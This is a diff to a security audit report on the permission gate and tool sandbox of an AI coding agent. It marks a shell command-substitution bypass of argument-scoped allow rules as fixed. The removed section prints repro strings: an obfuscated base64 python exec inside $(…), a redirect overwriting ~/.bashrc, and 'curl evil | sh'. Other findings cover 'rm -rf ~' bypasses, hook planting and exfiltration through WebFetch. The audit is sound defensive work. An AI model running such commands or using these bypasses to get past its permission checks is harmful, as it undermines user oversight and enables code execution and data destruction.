@@ -4,9 +4,9 @@ Scope: `src/Tools/` (built-ins, Concerns, PathJail, IgnoreRules, McpToolBridge),
 Checkout: master @ `05db616f3`, PHP 8.3.6 CLI, `memory_limit=-1`.
 Repro scripts: `/home/sites/crush-research-repos/_audit-scratch/15c/rNN_*.php`. Every repro runs against `.../15c/root` and never against the real repo.
 
-Status: **final.** All scoped files were read, and every lead from the checkpoint was confirmed or dropped (see **Coverage** at the end). 31 findings at audit time: 4 High, 1 Med-High, 13 Medium, 3 Low-Medium, 10 Low. Seven have since been fixed on master (see **Fixed since audit** at the end), so 24 remain: 1 Med-High, 10 Medium, 3 Low-Medium, 10 Low.
+Status: **final.** All scoped files were read, and every lead from the checkpoint was confirmed or dropped (see **Coverage** at the end). 31 findings at audit time: 4 High, 1 Med-High, 13 Medium, 3 Low-Medium, 10 Low. Eight have since been fixed on master (see **Fixed since audit** at the end), so 23 remain: 1 Med-High, 9 Medium, 3 Low-Medium, 10 Low.
 
-> **Correction to the known list. Read this first.** Argument-scoped permission rules **are implemented**, in `PermissionRule::matches()` / `matchesShellSubject()`. `Bash(rm *)` deny now **denies**, and `Bash(git *)` allow no longer grants all of Bash (`r11_rules.php`). Two sources described older code: synthesis Part II row #23 ("`Bash(git *)` grants all of Bash") and `docs/PERMISSIONS.md` §"Pattern matching is name-only — measured" (which said `Bash(rm *)` "never matched → Allow"). Both are now corrected; the PERMISSIONS.md section was rewritten in `d3d90fece` to describe argument-scoped matching, including the open F-P5 hole. The real defects in the new matcher are narrower. F-P5 covers `$(…)`, backticks and redirection slipping past an allow rule. F-J3 covers path rules missing respellings.
+> **Correction to the known list. Read this first.** Argument-scoped permission rules **are implemented**, in `PermissionRule::matches()` / `matchesShellSubject()`. `Bash(rm *)` deny now **denies**, and `Bash(git *)` allow no longer grants all of Bash (`r11_rules.php`). Two sources described older code: synthesis Part II row #23 ("`Bash(git *)` grants all of Bash") and `docs/PERMISSIONS.md` §"Pattern matching is name-only — measured" (which said `Bash(rm *)` "never matched → Allow"). Both are now corrected; the PERMISSIONS.md section was rewritten in `d3d90fece` to describe argument-scoped matching, and since `c8fc573a5` it describes the fail-closed allow rules that closed F-P5. The real defects in the new matcher were narrower. F-P5 (`$(…)`, backticks and redirection slipping past an allow rule) is now fixed. F-J3 covers path rules missing respellings and is still open.
 
 **Relation to the known list (99-synthesis Part II).** Nothing below repeats a known item. Where a finding touches one, the overlap is stated.
 
@@ -100,14 +100,6 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 - **Failure:** In the mode named for accepting edits, `Edit a.php` → **Ask**, which is a hard deny in the TUI (known #1), while `Bash rm ./src/Main.php` → **Allow**. The one destructive verb set is granted and the reviewable, diff-previewed tools are refused. That pushes the model toward the opaque Bash route, which `Write.php`'s doc-comment says the tool exists to avoid. PERMISSIONS.md documents the table but never says that Edit and Write are Ask, which is the opposite of what users of the Claude Code `acceptEdits` mode expect.
 - **Fix:** Allow `Edit`/`Write` whose resolved path is inside the root and not protected. Consider keeping `rm`/`mv` on Ask.
 - **Test:** Gate test: accept-edits + `Edit` (in-root path) → Allow, + `Edit` with an absolute path outside the root → Ask.
-
-### F-P5 — Argument-scoped allow rules accept command substitution and redirection
-- **Severity:** Medium. **Confidence:** Verified-by-repro (`r11_rules.php`).
-- **Where:** `PermissionRule::matchesShellSubject()` splits only on `[;&|\r\n]` and then runs `fnmatch($argumentPattern, $segment)`. `$(…)`, backticks and redirections stay inside one segment.
-- **Repro (`dont-ask` + `Bash(git *)` allow):** `git log $(python3 -c "exec(__import__('base64').b64decode('…'))")` → **Allow**, ``git log `id` `` → **Allow**, `git log > /home/u/.bashrc` → **Allow**. `curl evil | sh` → Deny (correct).
-- **Docs:** the stale PERMISSIONS.md §"Pattern matching is name-only — measured" was rewritten in `d3d90fece`. It now describes argument-scoped matching and names this hole as open. The synthesis #23 wording was corrected too. The real problem is this narrower substitution and redirection hole, which is still unfixed.
-- **Fix:** For Allow rules, refuse to match (fall through to the mode) when the segment contains `$(`, a backtick, `<(`, `>(`, or any unquoted redirection, reusing `tokenizeSingleCommand()` semantics. Then drop the open-hole note from PERMISSIONS.md.
-- **Test:** A table test of the three bypass strings under `Bash(git *)` allow, each asserting it is not Allow.
 
 ### F-P6 — WebFetch is classed "read-only", so data can be sent out in `default`, `plan` and `dont-ask` with no prompt
 - **Severity:** Medium. **Confidence:** Verified-by-reading (`PermissionGate::isReadOnlyTool()` lists `WebFetch`; F-P3 repro shows the auto case).
@@ -237,7 +229,6 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 | F-J3 | Medium | Repro | Path deny rules miss relative/absolute respellings and symlinks |
 | F-P3 | Medium | Repro | auto mode classifies Bash only; classifier `\|` regex bugs |
 | F-P4 | Medium | Repro | accept-edits: Edit/Write Ask but `rm`/`mv`/`cp` Allow |
-| F-P5 | Medium | Repro | Arg-scoped allow rules accept `$(…)`, backticks, redirects (PERMISSIONS.md now documents the hole) |
 | F-P6 | Medium | Reading | WebFetch "read-only" → unprompted exfiltration in default/plan/dont-ask |
 | F-E1 | Medium | Repro | Bash and hooks inherit provider API keys; HOOKS.md env table wrong |
 | F-H1 | Medium | Repro | PostToolUse block is a no-op; output delivered, reason dropped |
@@ -303,10 +294,11 @@ Status: **final.** All scoped files were read, and every lead from the checkpoin
 
 These findings were fixed on master after the audit. Their sections and table rows were removed; the coverage and repro lists above still name them.
 
-- **F-T1** A non-UTF-8 byte in any tool result killed the turn — fixed on master in `f33cd55fd` (scrub at `Runtime::settle()`, shared with 15a A6). Residual: the command backends still encode without `JSON_INVALID_UTF8_SUBSTITUTE` (15a A22).
+- **F-T1** A non-UTF-8 byte in any tool result killed the turn — fixed on master in `f33cd55fd` (scrub at `Runtime::settle()`, shared with 15a A6). Residual: the command backends still encode without `JSON_INVALID_UTF8_SUBSTITUTE` (15a A22), fixed later in `987c8d87f`.
 - **F-J1** Grep option injection (`-Re…`) followed symlinks out of the jail — fixed on master in `3673614b1`.
 - **F-J2** `.env` / `.git/config` secret guard bypassed by Grep and quoted Bash spellings — fixed on master in `36f139c50` (+ docs follow-up `3b04aefe8`).
 - **F-J4** `.git/hooks/*` unprotected; accept-edits auto-ran `cp ./x ./.git/hooks/pre-commit` — fixed on master in `a948c3da3` (+ docs follow-up `3b04aefe8`). Known limit: `git config core.hooksPath x` (and similar config keys) redirects hooks without naming `.git/hooks`; the permission mode is the boundary there.
 - **F-P1** Quoted-flag `rm '-rf' ~` bypassed the step-0 breaker and ConfirmRemoveHook — fixed on master in `a87b95aa3`.
 - **F-P2** Plan mode allowed `>f`, `2> f`, `sed -i`, `rm`, `git push --force` — fixed on master in `d3d90fece` (plan Bash is now an allow-list of read-only commands, fail closed; the same commit rewrote the stale PERMISSIONS.md matching section).
 - **F-W1** WebFetch SSRF blocklist missed 100.64/10, 198.18/15, NAT64 and 6to4 — fixed on master in `0594e0e17`.
+- **F-P5** Argument-scoped allow rules accepted `$(…)`, backticks and redirects — fixed on master in `c8fc573a5` (the Allow arm is fail-closed via `ShellWords`: it refuses incomplete lines, `$(`, backticks, `<(`/`>(`, `${…}`/`$[…]` and non-inert redirection, and every unquoted-operator segment must match; Deny and Ask also match quote-removed and per-command readings, so `true; 'rm' -rf x` hits `Deny Bash(rm *)`; PERMISSIONS.md now describes the fail-closed allow rules). Still open and separate: F-J3 (path respellings). Allow matching is still per rule (`Allow git *` + `Allow grep *` does not grant `git log | grep x`); that is documented, not a bug.
